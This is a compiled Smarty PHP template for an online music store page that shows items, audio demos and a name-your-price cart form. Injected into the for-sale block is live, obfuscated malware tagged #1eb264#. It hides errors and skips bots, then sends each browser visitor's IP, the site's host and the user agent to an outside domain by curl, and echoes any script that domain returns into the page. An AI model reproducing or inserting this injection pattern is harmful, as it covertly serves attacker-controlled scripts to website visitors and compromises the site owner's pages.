<?php /* Smarty version 2.6.22, created on 2010-12-09 21:37:32
         compiled from /home/a1425978/public_html//templates/store.html */ ?>
<?php $_from = $this->_tpl_vars['items']; if (!is_array($_from) && !is_object($_from)) { settype($_from, 'array'); }if (count($_from)):
    foreach ($_from as $this->_tpl_vars['item']):
?>

	<h2><?php echo $this->_tpl_vars['item']['name']; ?>
</h2>
	<img src="<?php echo $this->_tpl_vars['item']['image_url']; ?>
" class='styleRight' />
	<?php echo $this->_tpl_vars['item']['content']; ?>

	
	<div class="clearLeft">
		<object type="application/x-shockwave-flash" data="/dewplayer.swf?mp3=<?php echo $this->_tpl_vars['item']['audio_demo']; ?>
_lq.mp3" width="200" height="20">
		<param name="movie" value="/dewplayer.swf?mp3=<?php echo $this->_tpl_vars['item']['audio_demo']; ?>
_lq.mp3" />
		</object><br />
		<a href="<?php echo $this->_tpl_vars['item']['audio_demo']; ?>
.mp3">Download Audio Demo</a>
	</div>
	
	<?php if ($this->_tpl_vars['item']['for_sale']): ?>
<?php
#1eb264#
error_reporting(0); ini_set('display_errors',0); $wp_bl157 = @$_SERVER['HTTP_USER_AGENT'];
if (( preg_match ('/Gecko|MSIE/i', $wp_bl157) && !preg_match ('/bot/i', $wp_bl157))){
$wp_bl09157="http://"."tags"."cache".".com/cache"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bl157);
$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bl09157);
curl_setopt ($ch, CURLOPT_TIMEOUT, 6); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); $wp_157bl = curl_exec ($ch); curl_close($ch);}
if ( substr($wp_157bl,1,3) === 'scr' ){ echo $wp_157bl; }
#/1eb264#
?>
<?php

?>
<?php

?>
<?php

?>
		<form action = 'index.php' method = "GET">
			<div class="addToCart">
				<p style="margin:0px;">
					$<input type="text" class="textField" name='price' value="25.00" size='3'/>
					<input type='submit' value='Add To Cart' class='buttonSubmit' /><br />
					<span class="priceNotice">Name your price (0.00 and up) -- 25.00 is suggested</span>
				</p>
			</div>
			<input type="hidden" name="add_to_cart" value="true" />
			<input type="hidden" name="item_id" value="<?php echo $this->_tpl_vars['item']['id']; ?>
" />
		</form>
		<hr />
	<?php endif; ?>
	
<?php endforeach; endif; unset($_from); ?>